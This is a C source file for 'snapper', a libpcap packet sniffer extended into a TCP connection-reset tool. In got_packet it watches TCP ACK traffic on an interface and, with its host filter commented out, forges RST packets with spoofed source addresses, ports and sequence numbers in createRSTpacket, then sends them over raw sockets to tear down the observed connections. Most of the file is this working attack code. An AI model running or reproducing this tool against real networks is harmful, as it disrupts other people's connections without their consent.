/*
    Note a lot of code is borrowed from here and there.
    
    gcc -Wall -pedantic snapper.c -lpcap -o snapper
    http://www.tcpdump.org/pcap.html
    http://tools.ietf.org/html/rfc793
    http://tools.ietf.org/html/rfc1071
*/

#define APP_NAME        "snapper"
#define APP_DESC        "based on Sniffer example using libpcap"
#define APP_COPYRIGHT   "extended by Varun Singh / Copyright (c) 2005 The Tcpdump Group"
#define APP_DISCLAIMER  "THERE IS ABSOLUTELY NO WARRANTY FOR THIS PROGRAM.\n"

#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <signal.h>
#include <unistd.h> 
 
#define __USE_BSD         /* Using BSD IP header           */ 
#include <netinet/ip.h>   /* Internet Protocol             */ 
#define __FAVOR_BSD       /* Using BSD TCP header          */ 
#include <netinet/tcp.h>  /* Transmission Control Protocol */
 
 
/* default snap length (maximum bytes per packet to capture) */
#define SNAP_LEN 1518

/* ethernet headers are always exactly 14 bytes [1] */
#define ETHHDRSIZE 14

/* Ethernet addresses are 6 bytes */
#define ETHER_ADDR_LEN  6

/* IPv4, TCP, IP+TCP header sizes */
#define IPHDRSIZE sizeof(struct sniff_ip)
#define TCPHDRSIZE sizeof(struct sniff_tcp)
#define IPTCPHDRSIZE IPHDRSIZE + TCPHDRSIZE


#define HOME_IP "192.168.0.15"
/*
This should be autodetected...
*/

#define CAPTURE_COUNT 2           /* number of packets to capture, -1: non-stop */

/* Ethernet header */
struct sniff_ethernet {
        u_char  ether_dhost[ETHER_ADDR_LEN];    /* destination host address */
        u_char  ether_shost[ETHER_ADDR_LEN];    /* source host address */
        u_short ether_type;                     /* IP? ARP? RARP? etc */
};

/* IP header */
struct sniff_ip {
        u_char  ip_vhl;                 /* version << 4 | header length >> 2 */
        u_char  ip_tos;                 /* type of service */
        u_short ip_len;                 /* total length */
        u_short ip_id;                  /* identification */
        u_short ip_off;                 /* fragment offset field */
        #define IP_RF 0x8000            /* reserved fragment flag */
        #define IP_DF 0x4000            /* dont fragment flag */
        #define IP_MF 0x2000            /* more fragments flag */
        #define IP_OFFMASK 0x1fff       /* mask for fragmenting bits */
        u_char  ip_ttl;                 /* time to live */
        u_char  ip_p;                   /* protocol */
        u_short ip_sum;                 /* checksum */
        struct  in_addr ip_src,ip_dst;  /* source and dest address */
};
#define IP_HL(ip)               (((ip)->ip_vhl) & 0x0f)
#define IP_V(ip)                (((ip)->ip_vhl) >> 4)

/* device */
struct bpf_program fp;      /* compiled filter program (expression) */
char cnet[17];              /* dot notation of the network address */
bpf_u_int32 net;            /* network address */
char cmask[17];             /* dot notation of the network mask    */
bpf_u_int32 mask;           /* subnet mask */
pcap_t *handle;             /* packet capture handle */


/* TCP header */
typedef u_int tcp_seq;

struct sniff_tcp {
        u_short th_sport;       /* source port */
        u_short th_dport;       /* destination port */
        tcp_seq th_seq;         /* sequence number */
        tcp_seq th_ack;         /* acknowledgement number */
        u_char  th_offx2;       /* data offset, rsvd */
#define TH_OFF(th)      (((th)->th_offx2 & 0xf0) >> 4)
        u_char  th_flags;
        #define TH_FIN  0x01    /* 1  */
        #define TH_SYN  0x02    /* 2  */
        #define TH_RST  0x04    /* 4  */
        #define TH_PUSH 0x08    /* 8  */
        #define TH_ACK  0x10    /* 16 */
        #define TH_URG  0x20    /* 32 */
        #define TH_ECE  0x40    /* 64 */
        #define TH_CWR  0x80    /* 128*/
        #define TH_FLAGS        (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
        u_short th_win;         /* window */
        u_short th_sum;         /* checksum */
        u_short th_urp;         /* urgent pointer */
};

/* Pseudoheader (Used to compute TCP checksum. from RFC793) */
struct pseudo_hdr {
    u_int32_t src;     /* 32bit source ip address*/
    u_int32_t dst;     /* 32bit destination ip address */  
    u_char zero;       /* 8 reserved bits (all 0)  */
    u_char protocol;   /* protocol field of ip header */
    u_int16_t tcplen;  /* tcp length (both header and data */
};


void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);

void print_app_banner(void);

void print_app_usage(void);

void readTCPflag(u_char tcp_flags);

void whichPacketIsIt(u_char protocol);

void showPacketDetails(const struct sniff_ip *iph, const struct sniff_tcp *tcph);

void createRSTpacket(struct in_addr srcip, struct in_addr destip, u_short sport, u_short dport,
                        u_short ident, unsigned int seq, u_char ttl, unsigned int ack);

void print_app_banner(void)
{

    printf("%s - %s\n", APP_NAME, APP_DESC);
    printf("%s\n", APP_COPYRIGHT);
    printf("%s\n", APP_DISCLAIMER);
    printf("\n");

return;
}

/* 
    Copy pasted the code from the interwebs. Outputs of in_cksum() and
    checksum_comp() are equivalent, but note that in checksum_comp() we
    transform the checksum using htons() before returning the value.
    
    Read: http://tools.ietf.org/html/rfc1071 for the algorithm
 */
 
unsigned short in_cksum(unsigned short *addr,int len){
    register int sum = 0;
    u_short answer = 0;
    register u_short *w = addr;
    register int nleft = len;
    
    /*
    * Our algorithm is simple, using a 32-bit accumulator (sum),
    * we add sequential 16-bit words to it, and at the end, fold back 
    * all the carry bits from the top 16 bits into the lower 16 bits. 
    */
    
    while (nleft > 1) {
    sum += *w++;
    nleft -= 2;
    }

    /* mop up an odd byte, if necessary */
    if (nleft == 1) {
    *(u_char *)(&answer) = *(u_char *) w;
    sum += answer;
    }

    /* add back carry outs from top 16 bits to low 16 bits */
    sum = (sum >> 16) + (sum &0xffff); /* add hi 16 to low 16 */
    sum += (sum >> 16); /* add carry */
    answer = ~sum; /* truncate to 16 bits */
    return(answer);

}

uint16_t checksum_comp( uint16_t *addr , int len ) {   
    int count = len;
    uint16_t temp;
    register long sum = 0;
    uint16_t checksum;

    while( count > 1 )  {
        temp = htons(*addr++);
        sum += temp;
        count -= 2;
    }

    /*  Add left-over byte*/
    if( count > 0 )
        sum += * (unsigned char *) addr;

    /* wrap the 32-bit sum into 16 bits */
    while (sum>>16)
        sum = (sum & 0xffff) + (sum >> 16);
   checksum = ~sum;
   return htons(checksum);
}


void signal_handler(int signal)
{
    /* cleanup */
    pcap_freecode(&fp);
    pcap_close(handle);
    
    printf("\nGoodbye!!\n"); 
    exit(0);
}

void print_app_usage(void)
{

    printf("Usage: %s [interface]\n", APP_NAME);
    printf("\n");
    printf("Options:\n");
    printf("    interface    Listen on <interface> for packets.\n");
    printf("\n");

return;
}


/*
 * dissect/print packet
 */
void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
    static int count = 1;                   /* packet counter */
    
    /* declare pointers to packet headers */
    const struct sniff_ethernet *ethernet;  /* The ethernet header [1] */
    const struct sniff_ip *ip;              /* The IP header */
    const struct sniff_tcp *tcp;            /* The TCP header */
    const u_char *payload;                    /* Packet payload */

    int size_ip;
    int size_tcp;
    int size_payload;
    u_short ipcsum, tcpcsum;
    
    char srcHost[17];
    char dstHost[17];
    unsigned int srcport;
    unsigned int dstport;
    
    /* define ethernet header */
    ethernet = (struct sniff_ethernet*)(packet);
    
    /* define/compute ip header offset */
    ip = (struct sniff_ip*)(packet + ETHHDRSIZE);
    size_ip = IP_HL(ip)*4;
    if (size_ip < IPHDRSIZE) {
        printf("   * Invalid IP header length: %u bytes\n", size_ip);
        return;
    }
    strcpy(srcHost, inet_ntoa(ip->ip_src));
    strcpy(dstHost, inet_ntoa(ip->ip_dst));
    
    whichPacketIsIt(ip->ip_p);
    
    /* determine protocol */    
    if (ip->ip_p == IPPROTO_TCP)
    {
/*        if((strcmp(srcHost, HOME_IP)==0)||
                    (strcmp(dstHost, HOME_IP)==0)) */
        {
            /* define/compute tcp header offset */
            tcp = (struct sniff_tcp*)(packet + ETHHDRSIZE + IPHDRSIZE);
            size_tcp = TH_OFF(tcp)*4;
            if (size_tcp < TCPHDRSIZE) {
                printf("   * Invalid TCP header length: %u bytes\n", size_tcp);
                return;
            }
            srcport = ntohs(tcp->th_sport);
            dstport = ntohs(tcp->th_dport);
        
            /* define/compute tcp payload (segment) offset */
            payload = (u_char *)(packet + ETHHDRSIZE + IPHDRSIZE + TCPHDRSIZE);
    
            /* compute tcp payload (segment) size */
            size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);
    
            printf("P%d:\t", count);
            count++;
            /* print source and destination IP addresses */
            printf("From: %s\t", srcHost);
            printf("To: %s\t", dstHost);            
            printf("sport: %d\t", srcport);
            printf("dport: %d\t", dstport);
            printf("id: %d\t", htons(ip->ip_id));
            printf("seq: %u\t", ntohl(tcp->th_seq));  
            printf("ack: %u\t", ntohl(tcp->th_ack));  
            printf("sum: %x\n", (ip->ip_sum));

            /*
            if (size_payload > 0) {
                printf("   Payload (%d bytes)", size_payload);
            }
            */

            /*printf("Sniffed Packet Header\n");*/
            showPacketDetails(ip, tcp); 
            
/*            if(strcmp(srcHost, HOME_IP) == 0)*/
            {
                /*
                    Create spurious RST packet
                    Send the ACK number as sequence number to the source
                    Send the incremented SEQ to the target
                */
                createRSTpacket(ip->ip_src, ip->ip_dst, tcp->th_sport, tcp->th_dport, ip->ip_id, tcp->th_ack, ip->ip_ttl-1, tcp->th_ack);
                createRSTpacket( ip->ip_dst, ip->ip_src, tcp->th_dport, tcp->th_sport, ip->ip_id, htonl(ntohl(tcp->th_seq)+1), ip->ip_ttl-1, tcp->th_ack);
            }
        }
    }
    return;
}

void createRSTpacket(struct  in_addr srcip, struct  in_addr destip, u_short sport, u_short dport, u_short ident, unsigned int seq, u_char  ttl, unsigned int ack) {
    #if 1
    int sockfd;
    struct sockaddr_in dstaddr;
    char datagram[4096];  /* buffer for datagrams */
    struct sniff_ip *iph = (struct sniff_ip *) datagram;
    struct sniff_tcp *tcph = (struct sniff_tcp *) (datagram + sizeof (struct sniff_ip));
    int one = 1;
    const int *val = &one;
    struct pseudo_hdr *phdr;
    char temp_addr[16];
    
    
    if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) < 0) {
        perror("createRSTpacket() sock failed:");
        exit(EXIT_FAILURE);
    }
    /* Recommended by Stevens: you need the "one" variable for setsockopt
    call so here it is*/
    if (setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0){
        printf ("Warning: Cannot set HDRINCL from port %d to port %d\n", 
            ntohs(sport), ntohs(dport));
        perror("setsockopt: ");
    }

    strncpy(temp_addr, inet_ntoa(srcip), 16); /*BUG: destip or srcip?*/
    dstaddr.sin_family = AF_INET;
    dstaddr.sin_port = dport;
    inet_pton(AF_INET, temp_addr, &dstaddr.sin_addr);

    memset (datagram, 0, 4096);          /* zero out the buffer */
    iph->ip_vhl = 0x45;                  /* version=4,header_length=5 */
    iph->ip_tos = 0;                     /* type of service not needed */
    iph->ip_len = (IPTCPHDRSIZE);        /* no payload for RST */
                                         /* wierd thing [TODO][BUG]:
                                                htons() for linux
                                                no htons for mac os x/BSD 
                                         */
    iph->ip_id  = ident;                 /* ID */
    iph->ip_off = 0;                     /* no fragmentation */
    iph->ip_ttl = ttl;                    /* Time to Live, default:255 */
    iph->ip_p   = IPPROTO_TCP;           /* IPPROTO_TCP or IPPROTO_UDP */
    iph->ip_src = srcip;                 /* faking source device IP */
    iph->ip_dst = destip;                /* target destination address */
    iph->ip_sum = 0;                    /* Checksum. (Zero until computed)  */

    /* From RFC793
      In all states except SYN-SENT, all reset (RST) segments are validated
      by checking their SEQ-fields.  A reset is valid if its sequence number
      is in the window.  In the SYN-SENT state (a RST received in response
      to an initial SYN), the RST is acceptable if the ACK field
      acknowledges the SYN.

      The receiver of a RST first validates it, then changes state.  If the
      receiver was in the LISTEN state, it ignores it.  If the receiver was
      in SYN-RECEIVED state and had previously been in the LISTEN state,
      then the receiver returns to the LISTEN state, otherwise the receiver
      aborts the connection and goes to the CLOSED state.  If the receiver
      was in any other state, it aborts the connection and advises the user
      and goes to the CLOSED state.
     */
                                        
    tcph->th_sport = sport;              /* faking source port */
    tcph->th_dport = dport;              /* target destination port */
    tcph->th_seq   = seq;                /* the random SYN sequence */
    tcph->th_ack   = ack;                /* No ACK needed? or echo ACK?*/
    tcph->th_offx2 = 0x50;               /* 50h (5 offset) ( 8 0s reserved )*/
    tcph->th_flags = TH_RST;             /* initial connection request FLAG*/
    tcph->th_win   =  0;                 /* Window size default: htons(4500) + rand()%1000  */
                                         /* maximum allowed window size 65k*/
    tcph->th_urp   = 0;                  /* no urgent pointer */
    tcph->th_sum=0;                      /* Checksum. (Zero until computed) */
    /* pseudo header for tcp checksum */
    phdr = (struct pseudo_hdr *) (datagram + IPTCPHDRSIZE);
    phdr->src = srcip.s_addr;
    phdr->dst = destip.s_addr;
    phdr->zero = 0;
    phdr->protocol = IPPROTO_TCP;
    phdr->tcplen = htons(TCPHDRSIZE);       
                    /* in bytes the tcp segment length default:0x14*/
                    
    tcph->th_sum = in_cksum((unsigned short *)(tcph), IPTCPHDRSIZE);
    printf(" TCP sum=%x\t",tcph->th_sum);

    iph->ip_sum = checksum_comp((unsigned short *)iph, IPHDRSIZE); 
    printf(" IP sum=%x\n",iph->ip_sum);
    

    if (sendto(sockfd, datagram, IPTCPHDRSIZE, 0, (struct sockaddr *)&dstaddr, sizeof(dstaddr)) < 0) {
        fprintf(stderr, "Error sending datagram: from port %d to port %d\n", 
                ntohs(sport), ntohs(dport));
        perror("sendto: ");
    }
    else {
        printf("Packet sent to address: %s\n", inet_ntoa(dstaddr.sin_addr));
    }
    
    /*printf("RST packet IP Header\n");*/
    showPacketDetails(iph, tcph);
    close(sockfd);
    #endif
}


void showPacketDetails(const struct sniff_ip *iph, const struct sniff_tcp *tcph)
{
    /*should cleanup: 0 to DEBUG*/
    #if 0
    printf(" vhl=%x\n",iph->ip_vhl);       
    printf(" tos=%x\n",iph->ip_tos);       
    printf(" len=%d IP+TCP hdr len=%ld\n",ntohs(iph->ip_len), IPTCPHDRSIZE);
    printf(" ide=%d\n",ntohs(iph->ip_id));
    printf(" off=%d\n",ntohs(iph->ip_off));
    printf(" ttl=%x\n",iph->ip_ttl);
    printf(" pro=%x\n",iph->ip_p);
    printf(" src=%s\n",inet_ntoa(iph->ip_src));
    printf(" dst=%s\n",inet_ntoa(iph->ip_dst));
    printf(" sum=%x\n",(iph->ip_sum)); /* no ntohs */
    
    printf(" sport=%d\n", ntohs(tcph->th_sport));
    printf(" dport=%d\n", ntohs(tcph->th_dport));
    printf(" seq=%u\n"  , ntohl(tcph->th_seq));  
    printf(" ack=%u\n"  , ntohl(tcph->th_ack));  
    printf(" offx2=%d\n", tcph->th_offx2);
    printf(" win=%d\n"  , ntohs(tcph->th_win));
    printf(" sum=%x\n"  , (tcph->th_sum)); /* no ntohs */
    printf(" urp=%d\n"  , tcph->th_urp);
    /*Print which flag is set in TCP*/
    readTCPflag(tcph->th_flags);
    printf("\n");
    #endif
}

void readTCPflag(u_char tcp_flags)
{
    /*printf("   th_flags (%x, %x)\t", tcp_flags, tcp_flags & TH_FLAGS);
    printf("   Flag: "); */
    if (tcp_flags & TH_FIN) { printf(" FIN"); }
    if (tcp_flags & TH_SYN) { printf(" SYN"); }
    if (tcp_flags & TH_RST) { printf(" RST"); }
    if (tcp_flags & TH_PUSH){ printf(" PUSH"); }
    if (tcp_flags & TH_ACK) { printf(" ACK"); }
    if (tcp_flags & TH_URG) { printf(" URG"); }
    if (tcp_flags & TH_ECE) { printf(" ECE"); }
    if (tcp_flags & TH_CWR) { printf(" CWR"); }
    
}

void whichPacketIsIt(u_char protocol) {
    /*should cleanup: 0 to DEBUG*/
    #if 0
    switch(protocol) {
        case IPPROTO_TCP:
            printf("   Protocol: TCP\n");
            break;
        case IPPROTO_UDP:
            printf("   Protocol: UDP\n");
            break;
        case IPPROTO_ICMP:
            printf("   Protocol: ICMP\n");
            break;
        case IPPROTO_IP:
            printf("   Protocol: IP\n");
            break;
        default:
            printf("   Protocol: unknown\n");
            break;
    }
    #endif
}

int main(int argc, char **argv)
{
    char *dev = NULL;               /* capture device name */
    char errbuf[PCAP_ERRBUF_SIZE];  /* error buffer */
    /*
    * Expression			Description
    * ----------			-----------
    * ip					Capture all IP packets.
    * tcp					Capture only TCP packets.
    * tcp port 80			Capture only TCP packets with a port equal to 80.
    * ip host 10.1.2.3		Capture all IP packets to or from host 10.1.2.3.
    *
    ****************************************************************************
    *
    */
    char filter_exp[] = "(tcp[13] == 0x10) or (tcp[13] == 0x18)";       
    pcap_if_t *alldevices, *device;
    pcap_addr_t listaddr;
    int i, choice;
    struct in_addr addr1, addr2;
    
    /* Ctrl+C */
    signal ( SIGINT, signal_handler);

    print_app_banner();

    /* check for capture device name on command-line */
    if (argc == 2) {
        dev = argv[1];
    }
    else if (argc > 2) {
        fprintf(stderr, "error: unrecognized command-line options\n\n");
        print_app_usage();
        exit(EXIT_FAILURE);
    }
    else {
        if (pcap_findalldevs(&alldevices, errbuf) == -1) {
            fprintf(stderr,"Error in pcap_findalldevs: %s\n", errbuf);
            exit(1);
        }

        /* Print the list */
        for(device=alldevices; device; device=device->next) {
            printf("%d. %s", ++i, device->name);
            if (device->description)
                printf(" (%s)\t", device->description);
            else
                printf(" (No description available)\t");
            listaddr=device->addresses[0];
            strcpy(cnet, inet_ntoa(((struct sockaddr_in*)listaddr.addr)->sin_addr));
            printf("IP ADDR: %s\n", cnet);
        }
        if(i==0) {
            printf("\nNo interfaces found! Make sure WinPcap is installed.\n");
            return -1;
        }

        printf("Enter the interface number (1-%d):",i);
        scanf("%d", &choice);

        if(choice < 1 || choice > i) {
            printf("\nInterface number out of range.\n");
            /* Free the device list */
            pcap_freealldevs(alldevices);
            return -1;
        }
        
        /* Iterate the link list to the chosen device */
        for(device=alldevices, i=0; i< choice-1 ;device=device->next, i++);
        dev=device->name;
        
        /*
        strcpy(cnet, inet_ntoa(((struct sockaddr_in*)device->addresses[0].addr)->sin_addr));
        printf("IP ADDR: %s\t",cnet);
        */
        
        if (dev == NULL) {
            fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
            exit(EXIT_FAILURE);
        }
    }
    
    /* get network number and mask associated with capture device */
    if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
        fprintf(stderr, "Couldn't get netmask for device %s: %s\n",
            dev, errbuf);
        net = 0;
        mask = 0;
    }
    else {
        addr1.s_addr = net;
        strcpy(cnet, inet_ntoa(addr1));
        addr2.s_addr = mask;
        strcpy(cmask, inet_ntoa(addr2));
        printf("NET: %s %x CMASK: %s %x\n",cnet, htonl(net), cmask, htonl(mask));
        
    }

    /* print capture info */
    printf("Device: %s\n", dev);
/*
    printf("Number of packets: %d\n", CAPTURE_COUNT);
    printf("Filter expression: %s\n", filter_exp);
*/

    /* open capture device */
    handle = pcap_open_live(dev, SNAP_LEN, 1, 1000, errbuf); 
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
        exit(EXIT_FAILURE);
    }

    /* make sure we're capturing on an Ethernet device [2] */
    if (pcap_datalink(handle) != DLT_EN10MB) {
        fprintf(stderr, "%s is not an Ethernet\n", dev);
        exit(EXIT_FAILURE);
    }

    /* compile the filter expression */
    if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
        fprintf(stderr, "Couldn't parse filter %s: %s\n",
            filter_exp, pcap_geterr(handle));
        exit(EXIT_FAILURE);
    }

    /* apply the compiled filter */
    if (pcap_setfilter(handle, &fp) == -1) {
        fprintf(stderr, "Couldn't install filter %s: %s\n",
            filter_exp, pcap_geterr(handle));
        exit(EXIT_FAILURE);
    }

    /* now we can set our callback function */
    pcap_loop(handle, CAPTURE_COUNT, got_packet, NULL);
    printf("\nCapture complete.\n");

return 0;
}

